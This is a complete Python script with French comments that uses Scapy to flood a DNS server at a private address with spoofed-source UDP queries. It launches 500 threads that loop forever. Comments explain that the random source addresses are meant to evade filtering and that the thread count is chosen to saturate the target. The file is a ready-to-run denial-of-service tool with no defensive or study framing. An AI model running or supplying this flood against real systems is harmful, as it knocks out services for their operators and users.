from scapy.all import *
import threading
import random

# Cible de l'attaque
target_ip = "192.168.1.2"
target_port = 53  # DNS
def flood():
	while True:
		# Adresse source aléatoire pour éviter le filtrage
		src_ip = f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}"
		
		# Construction du paquet
		ip = IP(src=src_ip, dst=target_ip)
		udp = UDP(sport=random.randint(1024, 65535), dport=target_port)
		dns = DNS(id=random.randint(0, 65535), qd=DNSQR(qname="example.com"))
		packets = [ip / udp / dns for _ in range(10)]
		# Envoi du paquet
		send(packets, verbose=1)

# Lancer plusieurs threads pour envoyer plus vite
num_threads = 500  # Augmente à 500 si tu veux vraiment saturer

threads = []
for _ in range(num_threads):
	thread = threading.Thread(target=flood)
	thread.daemon = True  # Se ferme quand le script s'arrête
	thread.start()
	threads.append(thread)

# Attendre que les threads tournent indéfiniment
for thread in threads:
	thread.join()
